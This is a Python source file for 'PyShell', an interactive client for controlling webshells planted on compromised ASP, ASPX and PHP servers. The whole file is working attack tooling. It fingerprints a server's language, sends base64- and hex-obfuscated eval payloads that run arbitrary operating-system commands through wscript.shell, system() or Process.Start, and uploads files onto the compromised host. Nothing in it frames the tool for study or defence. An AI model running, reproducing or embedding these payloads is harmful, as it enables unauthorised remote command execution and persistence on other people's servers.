#!/usr/bin/python3
# -*- coding: UTF-8 -*-

import readline
import sys
import platform
import os
import requests
import base64


class pyshell:
    coding = 'utf-8'
    Type = ''
    cmd = 'cmd'  
    lpath = ''   #本地路径
    rpath = ''   #目标路径
    url = 'localhost'
    pwd = ''
    data = '[×] '
    c_file = 'NULL'
    def main():
        banner = '''
 _ __    _   _    ____   _       _____   __      __
| '_ \  | | | |  / ___\ | |__   | ____| | _|    | _|
| |_) | | |_| |  \ \    | '_ \  |  _|   | _|    | _|
| .__/   \__, | __\ \   | | | | | |___  |  |__  |  |__ 
|_|      |___/  \___/   |_| |_| |_____| \_____| \_____|
                                  
'''
        version = '\n                [ PyShell By Grey ]\n\n'
        print (banner + version)
        pyshell.start()
    def start():
        pyshell.connect(pyshell.url,pyshell.pwd)
    def connect(url,pwd):
        try:
            while True:
                grey = input('PyShell > ')
                if 'set' in grey:
                    if 'set ' not in grey:
                        print("Usage: set coding   set shell   set lpath   set rpath")
                if 'set coding' in grey:
                    if 'set coding ' not in grey:
                        print("Usage: set coding UTF-8")
                    else:
                        pyshell.coding = grey[len('set coding')+1:]
                if 'set shell' in grey:
                    if 'set shell ' not in grey:
                        print("Usage: set shell cmd and /bin/sh")
                    else:
                        pyshell.cmd = grey[len('set shell')+1:]
                if 'set lpath' in grey:
                    if 'set lpath ' not in grey:
                        print("Usage: set lpath local path")
                    else:
                        pyshell.lpath = grey[len('set lpath')+1:]
                if 'set rpath' in grey:
                    if 'set rpath ' not in grey:
                        print("Usage: set rpath remote path")
                    else:
                        pyshell.rpath = grey[len('set rpath')+1:]
                if 'open' in grey:
                    if 'open ' not in grey:
                        print("Usage: open http://localhost/xxx.php")
                    else:
                        url = grey[len('open')+1:]
                        pwd = input('(Pwd) ')
                        try:
                            asp_payload = '=response.Write("greyok")'
                            asp_http = requests.get(url+'?'+pwd+asp_payload)
                            asp_html = asp_http.text
                            php_payload = 'echo "greyok";'
                            php_http = requests.post(url,data={pwd:php_payload})
                            php_html = php_http.text
                            aspx_payload = 'Response.Write("greyok");'
                            aspx_http = requests.post(url,data={pwd:aspx_payload})
                            aspx_html = aspx_http.text
                            uname = 'echo php_uname(\'s\');'
                            uname_http = requests.post(url,data={pwd:uname})
                            uname_html = uname_http.text
                            if 'greyok' in asp_html:
                                print("[√] The connection is successful!")
                                pyshell.data = '[√] '
                                pyshell.Type = 'asp'
                            if 'greyok' in aspx_html:
                                print("[√] The connection is successful!")
                                pyshell.data = '[√] '
                                pyshell.Type = 'aspx'
                            if 'greyok' in php_html:
                                print("[√] The connection is successful!")
                                pyshell.data = '[√] '
                                pyshell.Type = 'php'
                        except Exception as e:
                            pass
                if 'show' in grey:
                    if 'show ' not in grey:
                        res = pyshell.data
                        show  = '\n show     \n'
                        show += '-------------\n\n'
                        show += res+url +'\n'
                        print(show)
                if 'help' in grey:
                    if 'help ' not in grey:
                        show_help  = '\n Commands:\n'
                        show_help += '------------\n'
                        show_help += ' help   set   show   cd   upload   shell   open   exit   quit\n'
                        print(show_help)
                if 'cd' in grey:
                    if 'cd ' not in grey:
                        print("Usage: cd C:\\")
                    else:
                        pyshell.c_file = grey[len('cd')+1:]
                if grey == 'upload':
                    if pyshell.Type == 'asp':
                        pyshell.asp_upload(url,pwd)
                    if pyshell.Type == 'php':
                        pyshell.php_upload(url,pwd)
                    if pyshell.Type == 'aspx':
                        pyshell.aspx_upload(url,pwd)

                if grey == 'exit':
                    exit(1)
                if grey == 'shell':
                    try:
                        if pyshell.Type == 'asp':
                            asp_file_payload = '=response.write(server.mappath(Request.ServerVariables("SCRIPT_NAME")))'
                            asp_file_http = requests.get(url+'?'+pwd+asp_file_payload)
                            asp_file_html = asp_file_http.text
                            asp_file_html = asp_file_html[:asp_file_html.rfind("\\")+1].replace('\\','\\')
                            if pyshell.c_file == 'NULL':
                                pyshell.c_file = asp_file_html
                            while True:
                                shell = input(pyshell.FAIL+pyshell.c_file+' > ')
                                if shell == 'quit':
                                    pyshell.c_file = 'NULL'
                                    break
                                if shell == 'exit':
                                    pyshell.c_file = 'NULL'
                                    break

                                pyshell.asp_shell(url,pwd,shell)
                        if pyshell.Type == 'php':
                            if 'Windows' in uname_html:
                                pyshell.cmd = 'cmd'
                            else:
                                pyshell.cmd = '/bin/sh'
                            php_file_payload = '@eval(base64_decode($_POST[z0]));'
                            php_file_http = requests.post(url,data={pwd:php_file_payload,'z0':'ZWNobyBkaXJuYW1lKF9fRklMRV9fKTtAZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFt6MV0pKTs='})
                            php_file_html = php_file_http.text
                            if pyshell.c_file == 'NULL':
                                pyshell.c_file = php_file_html
                            while True:
                                shell = input(pyshell.c_file+' > ')
                                if shell == 'quit':
                                    pyshell.c_file = 'NULL'
                                    break
                                if shell == 'exit':
                                    pyshell.c_file = 'NULL'
                                    break
                                pyshell.php_shell(url,pwd,shell)
                        if pyshell.Type == 'aspx':
                            aspx_file_payload = 'Response.Write(HttpContext.Current.Server.MapPath("."));'
                            aspx_file_http = requests.post(url,data={pwd:aspx_file_payload})
                            aspx_file_html = aspx_file_http.text+'\\'
                            if pyshell.c_file == 'NULL':
                                pyshell.c_file = aspx_file_html
                            while True:
                                shell = input(pyshell.c_file+' > ')
                                if shell == 'quit':
                                    pyshell.c_file = 'NULL'
                                    break
                                if shell == 'exit':
                                    pyshell.c_file = 'NULL'
                                    break
                                pyshell.aspx_shell(url,pwd,shell)
                    except Exception as e:
                        pass
        except Exception as e:
            pass

    def asp_shell(url,pwd,shell):
        try:             
            payload = '=Execute("Execute(""On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci%2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Response.Write(""""->|""""):Execute(""""On+Error+Resume+Next:""""%26bd(""""53657420583D4372656174654F626A6563742822777363726970742E7368656C6C22292E657865632822222222266264285265717565737428227A3122292926222222202F6320222222266264285265717565737428227A322229292622222222293A496620457272205468656E3A533D225B4572725D2022264572722E4465736372697074696F6E3A4572722E436C6561723A456C73653A4F3D582E5374644F75742E52656164416C6C28293A453D582E5374644572722E52656164416C6C28293A533D4F26453A456E642049663A526573706F6E73652E7772697465285329"""")):Response.Write(""""|<-""""):Response.End"")")&z1='
            shell_payload1 = 'cd /d "'+pyshell.c_file+'"&'+shell+'&'
            cmd_payload = bytes(pyshell.cmd,encoding='utf-8')
            shell_payload2 = bytes(shell_payload1,encoding='utf-8')
            shell_payload3 = '&z2='+shell_payload2.hex()
            shell_http = requests.get(url+'?'+pwd+payload+cmd_payload.hex()+shell_payload3)
            shell_http.encoding = pyshell.coding
            shell_html = shell_http.text
            z1 = shell_html.replace('->|','')
            z2 = z1.replace('|<-','')
            print('\n'+z2)
        except Exception as e:
            pass
    def php_shell(url,pwd,shell):
        try:
            if_payload = 'echo php_uname(\'s\');'
            if_code = {
                pwd:if_payload
            }
            if_http = requests.post(url,data=if_code)
            if_html = if_http.text
            if 'Windows' in if_html:
                payload = '@eval(base64_decode($_POST[z0]));'
                cmd_base64 = str(base64.b64encode(pyshell.cmd.encode("utf-8")),"utf-8")
                code_file = {
                    pwd:payload,
                    'z0':'ZWNobyBkaXJuYW1lKF9fRklMRV9fKTtAZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFt6MV0pKTs='
                }
                files_http = requests.post(url,data=code_file)
                files_http.encoding = pyshell.coding
                files_html = files_http.text
                z = 'cd /d "'+pyshell.c_file+'"&'+shell
                z_base64 = str(base64.b64encode(z.encode("utf-8")),"utf-8")
                code = {
                pwd:payload,
                'z0':'QGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbejFdKSk7',
                'z1':'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejIiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInozIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs=',
                'z2':cmd_base64,
                'z3':z_base64
                }
                shell_http = requests.post(url,data=code)
                shell_http.encoding = pyshell.coding
                shell_html = shell_http.text
                z1 = shell_html.replace('->|','')
                z2 = z1.replace('|<-','')
                z3 = z2.replace('ret=1','')
                print('\n'+z3.strip()+'\n')
            else:
                payload = '@eval(base64_decode($_POST[z0]));'
                cmd_base64 = str(base64.b64encode(pyshell.cmd.encode("utf-8")),"utf-8")
                code_file = {
                    pwd:payload,
                    'z0':'ZWNobyBkaXJuYW1lKF9fRklMRV9fKTtAZXZhbChiYXNlNjRfZGVjb2RlKCRfUE9TVFt6MV0pKTs='
                }
                files_http = requests.post(url,data=code_file)
                files_http.encoding = pyshell.coding
                files_html = files_http.text
                z = 'cd "'+pyshell.c_file+'";'+shell+';'
                z_base64 = str(base64.b64encode(z.encode("utf-8")),"utf-8")
                code = {
                    pwd:payload,
                    'z0':'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskcD1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JHM9YmFzZTY0X2RlY29kZSgkX1BPU1RbInoyIl0pOyRkPWRpcm5hbWUoJF9TRVJWRVJbIlNDUklQVF9GSUxFTkFNRSJdKTskYz1zdWJzdHIoJGQsMCwxKT09Ii8iPyItYyBcInskc31cIiI6Ii9jIFwieyRzfVwiIjskcj0ieyRwfSB7JGN9IjtAc3lzdGVtKCRyLiIgMj4mMSIsJHJldCk7cHJpbnQgKCRyZXQhPTApPyIKcmV0PXskcmV0fQoiOiIiOztlY2hvKCJ8PC0iKTtkaWUoKTs=',
                    'z1':cmd_base64,
                    'z2':z_base64

                }
                shell_http = requests.post(url,data=code)
                shell_http.encoding = pyshell.coding
                shell_html = shell_http.text
                z1 = shell_html.replace('->|','')
                z2 = z1.replace('|<-','')
                z3 = z2.replace('ret=127','')
                print('\n'+z3.strip()+'\n')
        except Exception as e:
            pass
    def aspx_shell(url,pwd,shell):
        try:
            cmd_base64 = str(base64.b64encode(pyshell.cmd.encode("utf-8")),"utf-8")
            files_payload = 'Response.Write(HttpContext.Current.Server.MapPath("."));'
            files_http = requests.post(url,data={pwd:files_payload})
            files_http.encoding = pyshell.coding
            files_html = files_http.text+'\\'
            z2 = 'cd /d "'+pyshell.c_file+'"&'+shell
            z2_base64 = str(base64.b64encode(z2.encode("utf-8")),"utf-8")
            code = {
            pwd:'Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("dmFyIGM9bmV3IFN5c3RlbS5EaWFnbm9zdGljcy5Qcm9jZXNzU3RhcnRJbmZvKFN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDkzNikuR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoUmVxdWVzdC5JdGVtWyJ6MSJdKSkpO3ZhciBlPW5ldyBTeXN0ZW0uRGlhZ25vc3RpY3MuUHJvY2VzcygpO3ZhciBvdXQ6U3lzdGVtLklPLlN0cmVhbVJlYWRlcixFSTpTeXN0ZW0uSU8uU3RyZWFtUmVhZGVyO2MuVXNlU2hlbGxFeGVjdXRlPWZhbHNlO2MuUmVkaXJlY3RTdGFuZGFyZE91dHB1dD10cnVlO2MuUmVkaXJlY3RTdGFuZGFyZEVycm9yPXRydWU7ZS5TdGFydEluZm89YztjLkFyZ3VtZW50cz0iL2MgIitTeXN0ZW0uVGV4dC5FbmNvZGluZy5HZXRFbmNvZGluZyg5MzYpLkdldFN0cmluZyhTeXN0ZW0uQ29udmVydC5Gcm9tQmFzZTY0U3RyaW5nKFJlcXVlc3QuSXRlbVsiejIiXSkpO2UuU3RhcnQoKTtvdXQ9ZS5TdGFuZGFyZE91dHB1dDtFST1lLlN0YW5kYXJkRXJyb3I7ZS5DbG9zZSgpO1Jlc3BvbnNlLldyaXRlKG91dC5SZWFkVG9FbmQoKStFSS5SZWFkVG9FbmQoKSk7")),"unsafe");}catch(err){}Response.Write("|<-");Response.End();',
            'z1':cmd_base64,
            'z2':z2_base64
            }
            shell_http = requests.post(url,data=code)
            shell_http.encoding = pyshell.coding
            shell_html = shell_http.text
            z1 = shell_html.replace('->|','')
            z2 = z1.replace('|<-','')
            z3 = z2.replace('ret=1','')
            print('\n'+z3.strip()+'\n')
        except Exception as e:
            pass
    
    def asp_upload(url,pwd):
        try:
            payload = '''Eval("Execute(""On+Error+Resume+Next:Function+bd%28byVal+s%29%3AFor+i%3D1+To+Len%28s%29+Step+2%3Ac%3DMid%28s%2Ci%2C2%29%3AIf+IsNumeric%28Mid%28s%2Ci%2C1%29%29+Then%3AExecute
            %28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26%22%22%22%22%29%22%22%22%22%29%3AElse%3AExecute%28%22%22%22%22bd%3Dbd%26chr%28%26H%22%22%22%22%26c%26Mid%28s%2Ci
            %2B2%2C2%29%26%22%22%22%22%29%22%22%22%22%29%3Ai%3Di%2B2%3AEnd+If%22%22%26chr%2810%29%26%22%22Next%3AEnd+Function:Response.Write(""""->|""""):Execute(""""On+Error+Resume+Next:""""%26bd(""""44696D206C2C73732C66662C543A66663D6264287265717565737428227A312229293A73733D5265717565737428227A3222293A6C3D4C656E287373293A53657420533D5365727665722E4372656174654F626A656374282241646F
            64622E53747265616D22293A5769746820533A2E547970653D313A2E4D6F64653D333A2E4F70656E3A4966205265717565737428227A3322293E30205468656E3A2E4C6F616446726F6D46696C652022222666662622223A2E506F7369746
            96F6E3D2E53697A653A456E642049663A7365742072733D4372656174654F626A656374282241444F44422E5265636F726473657422293A72732E6669656C64732E617070656E6420226262222C3230352C6C2F323A72732E6F70656E3A72
            732E6164646E65773A72732822626222293D73732B636872622830293A72732E7570646174653A2E57726974652072732822626222292E6765746368756E6B286C2F32293A72732E636C6F73653A5365742072733D4E6F7468696E673A2E5
            06F736974696F6E3D303A2E53617665546F46696C652022222666662622222C323A2E436C6F73653A456E6420576974683A53657420533D4E6F7468696E673A496620457272205468656E3A543D4572722E4465736372697074696F6E3A45
            72722E436C6561723A456C73653A543D2231223A456E642049663A526573706F6E73652E5772697465285429"""")):Response.Write(""""|<-""""):Response.End"")")
            &z1={{rpath}}&z3=1'''.replace('\n','').replace(' ','')
            upload_file = open(pyshell.lpath,'rb')
            upload_files = upload_file.read()
            upload_files_r = upload_files.hex()
            upload_payload = '%s?%s=%s'%(url,pwd,payload.replace('{{rpath}}',pyshell.rpath.encode(pyshell.coding).hex()))
            now=0
            while True:
                if len(upload_files_r)>256:
                    tmp=upload_files_r[:256]
                    upload_files_r=upload_files_r[256:]
                    http = requests.post(upload_payload.replace('\n',''),data={'z2':tmp})
                    now+=128
                    sys.stdout.write('\r  \rAre uploading:')
                    sys.stdout.write(str(now/1024))
                    sys.stdout.flush()
                else:
                    http = requests.post(upload_payload.replace('\n',''),data={'z2':upload_files_r})
                    now+=len(upload_files_r)/2
                    sys.stdout.write('\r                                                     \rUpload to complete.\n')
                    sys.stdout.flush()
                    break
        except Exception as e:
            pass
    def php_upload(url,pwd):
        try:
            payload = '@eval(base64_decode($_POST[z0]));'
            path_base64 = str(base64.b64encode(pyshell.rpath.encode("utf-8")),"utf-8")
            with open(pyshell.lpath,'rb') as file:
                upload_file = file.read()
                upload_files = upload_file.hex()
            upload_files_r = ""
            for line in range(len(upload_files)):
                upload_files_r += upload_files[line]
                sys.stdout.write('\r  \rAre uploading:')
                sys.stdout.write(str(line/2048))

            code = {
            pwd:payload,
            'z0':'QGV2YWwoYmFzZTY0X2RlY29kZSgkX1BPU1RbejFdKSk7',
            'z1':'QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0+fCIpOzskZj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejIiXSk7JGM9JF9QT1NUWyJ6MyJdOyRjPXN0cl9yZXBsYWNlKCJcciIsIiIsJGMpOyRjPXN0cl9yZXBsYWNlKCJcbiIsIiIsJGMpOyRidWY9IiI7Zm9yKCRpPTA7JGk8c3RybGVuKCRjKTskaSs9MikkYnVmLj11cmxkZWNvZGUoIiUiLnN1YnN0cigkYywkaSwyKSk7ZWNobyhAZndyaXRlKGZvcGVuKCRmLCJ3IiksJGJ1Zik/IjEiOiIwIik7O2VjaG8oInw8LSIpO2RpZSgpOw==',
            'z2':path_base64,
            'z3':upload_files_r
            }
            http = requests.post(url,data=code)
            http.encoding = pyshell.coding
            html = http.text

            if html == '->|1|<-':
                sys.stdout.write('\r                                                     \rUpload to complete.\n')
                sys.stdout.flush()
            
        
        except Exception as e:
            pass
    def aspx_upload(url,pwd):
        try:
            path_base64 = str(base64.b64encode(pyshell.rpath.encode("utf-8")),"utf-8")
            with open(pyshell.lpath,'rb') as file:
                upload_file = file.read()
                upload_files = upload_file.hex()
            upload_files_r = ""
            for line in range(len(upload_files)):
                upload_files_r += upload_files[line]
                sys.stdout.write('\r  \rAre uploading:')
                sys.stdout.write(str(line/2048))
            code = {
                pwd:'Response.Write("->|");var err:Exception;try{eval(System.Text.Encoding.GetEncoding(936).GetString(System.Convert.FromBase64String("dmFyIFA6U3RyaW5nPVN5c3RlbS5UZXh0LkVuY29kaW5nLkdldEVuY29kaW5nKDkzNikuR2V0U3RyaW5nKFN5c3RlbS5Db252ZXJ0LkZyb21CYXNlNjRTdHJpbmcoUmVxdWVzdC5JdGVtWyJ6MSJdKSk7dmFyIFo6U3RyaW5nPVJlcXVlc3QuSXRlbVsiejIiXTt2YXIgQjpieXRlW109bmV3IGJ5dGVbWi5MZW5ndGgvMl07Zm9yKHZhciBpPTA7aTxaLkxlbmd0aDtpKz0yKXtCW2kvMl09Ynl0ZShDb252ZXJ0LlRvSW50MzIoWi5TdWJzdHJpbmcoaSwyKSwxNikpO312YXIgZnM6U3lzdGVtLklPLkZpbGVTdHJlYW09bmV3IFN5c3RlbS5JTy5GaWxlU3RyZWFtKFAsU3lzdGVtLklPLkZpbGVNb2RlLkNyZWF0ZSk7ZnMuV3JpdGUoQiwwLEIuTGVuZ3RoKTtmcy5DbG9zZSgpO1Jlc3BvbnNlLldyaXRlKCIxIik7")),"unsafe");}catch(err){}Response.Write("|<-");Response.End();',
                'z1':path_base64,
                'z2':upload_files_r
            }
            http = requests.post(url,data=code)
            http.encoding = pyshell.coding
            html = http.text
            if html == '->|1|<-':
                sys.stdout.write('\r                                                     \rUpload to complete.\n')
                sys.stdout.flush()
        except Exception as e:
            pass
if __name__ == "__main__":
    pyshell.main()
